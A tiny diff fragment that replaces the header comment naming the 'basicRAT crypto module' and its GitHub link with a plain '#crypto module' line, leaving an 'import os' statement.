@@ -1,7 +1,5 @@
-#
-# basicRAT crypto module
-# https://github.com/vesche/basicRAT
-#
+#crypto module
+
 
 import os
 
